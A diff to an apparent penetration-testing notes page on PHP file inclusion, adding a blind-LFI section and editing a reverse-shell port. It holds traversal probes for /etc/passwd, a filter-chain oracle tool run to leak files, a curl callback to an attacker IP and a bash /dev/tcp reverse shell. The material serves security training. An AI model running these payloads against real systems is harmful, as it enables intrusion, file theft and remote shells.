@@ -20,6 +20,7 @@ Web app dynamically includes files based on user input. LFI = local files, RFI =
 | [[Tools/Web/Burpsuite\|Burp Suite]] | Manual interception and testing of file inclusion params |
 | [[Tools/Web/LFI Suite\|LFI Suite]] | Automated LFI exploitation and path traversal |
 | [[Tools/Web/php_filter_chain_generator\|php_filter_chain_generator]] | Generate PHP filter chains for LFI → RCE |
+| [php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit) | Blind file **read** via filter-chain error oracle (no output reflected) |
 | [[Tools/Web/fimap\|fimap]] | LFI/RFI scanner and exploitation tool |
 | [[Tools/Web/LFI Freak\|LFI Freak]] / [[Tools/Web/liffy\|liffy]] | Alternative LFI exploitation frameworks |
 | [cnext-exploits](https://github.com/ambionics/cnext-exploits) | CVE-2024-2961 PoC — read-only LFI → RCE |
@@ -348,7 +349,7 @@ curl -s "http://target.com/?file=${CHAIN}&cmd=id"
 
 # For a reverse shell payload (URL-encode the shell command)
 python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
-# Then: ?file=<chain>&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261'
+# Then: ?file=<chain>&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/9001+0>%261'
 ```
 
 > [!tip]
@@ -1172,6 +1173,55 @@ Full exploitation detail for each path in [[Non-PHP Web App Attacks]].
 
 ---
 
+## Blind LFI (No Output Reflected)
+
+Everything above assumes the included file's **content is echoed back**. Often it isn't — the app includes the file for a side effect, suppresses output, or only tells you *success vs failure*. Don't conclude "not vulnerable": switch from *reading output* to *reading an oracle*, then jump straight to an out-of-band RCE.
+
+### 1. Confirm it blind — the existence/error oracle
+
+Even with zero content shown, the app's **response differential** between a file that exists and one that doesn't is an oracle: it confirms traversal *and* lets you enumerate files.
+
+```bash
+# Two requests, watch status/length/timing/error-string differ:
+?file=../../../../etc/passwd          # exists  -> 200 / "success" / no warning
+?file=../../../../etc/pas-DOESNOTEXIST # missing -> 500 / warning / different length
+```
+
+- **`include()`/`require()`** on a missing path emits a PHP *warning* (or fatal for `require`) — a length/status/error-string tell even when the body is blank.
+- Automate the diff by length: `ffuf -w wordlist -u 'http://t/?file=../../../../FUZZ' -fs <baseline-len>` (filter the "not found" size).
+
+### 2. Blind file **read** — the php://filter-chain oracle
+
+When the sink is a **read-only** function (`file_get_contents()`, `file()`, `hash_file()`) that never returns the content, you can still exfiltrate it byte-by-byte using a **filter-chain error oracle**: chained `iconv` conversions are built so the process errors (or not) depending on the next unknown byte, and the success/failure signal leaks one character at a time. This reads files with **no output reflected at all** — the read-only counterpart to the [filter-chain RCE](#php-filter-chain-rce-no-write-required) (which needs an `include`).
+
+```bash
+# github.com/synacktiv/php_filter_chains_oracle_exploit
+git clone https://github.com/synacktiv/php_filter_chains_oracle_exploit
+cd php_filter_chains_oracle_exploit
+
+# --file = the file to leak, --parameter = the vulnerable param name, --target = endpoint
+python3 filters_chain_oracle_exploit.py --target http://target/index.php \
+  --file '/etc/passwd' --parameter file --verb GET
+
+# POST body / headers / custom match string / offset are supported:
+python3 filters_chain_oracle_exploit.py --target http://target/api --parameter file \
+  --file '/var/www/html/config.php' --data 'file=INJECT' --verb POST
+```
+
+> [!tip] This is the tool to reach for the moment you see a **read sink with no reflection** (a "download" or "preview" endpoint that swallows errors). It works over the *error* signal, so a small response-length or status difference between valid/invalid chains is all it needs — no `include`, no `allow_url_include`, no write primitive. Add `--delay` if the target rate-limits; it also has a time-based mode when even the error signal is flat.
+
+### 3. Blind → RCE
+
+You can't read output, so **don't try to read the shell's output through the LFI** — drive execution out-of-band. Set up the RCE by any write/exec vector that doesn't need to echo (filter-chain-to-`include` RCE, log/mail poisoning, `data://`, `pearcmd.php`), then **prove and use it via a callback**, exactly like the [ssh2.exec OOB step](#ssh2exec--ssh2sftp--ssh-stream-wrappers-lfi--creds--rce):
+
+```bash
+# Payload calls back instead of printing — a hit on YOUR listener = RCE, silence = it didn't run
+;curl http://10.10.14.5:8001/pwned            # or nslookup <data>.oast.fun for DNS-only egress
+# Then upgrade to a reverse shell (base64 the command so >,&,' never touch the URL parser)
+```
+
+---
+
 ## Troubleshooting
 
 ### Not Working?
@@ -1276,6 +1326,7 @@ cat /proc/net/tcp | awk '{print $2}' | grep -v local
 6. LFI → SSH Keys → Lateral movement
 7. RFI → Reverse Shell → Full system
 8. LFI → SSRF → Internal services / Cloud metadata
+9. **Blind** LFI (no output) → filter-chain oracle read (`file_get_contents`/`file`) → creds → any of the above; or blind → RCE proven out-of-band (see Blind LFI section)
 
 ---
 
@@ -1326,5 +1377,5 @@ cat /proc/net/tcp | awk '{print $2}' | grep -v local
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-08-21*
-*Model: claude-opus-5*
+*Updated: 2026-09-18*
+*Model: claude-opus-4-8*
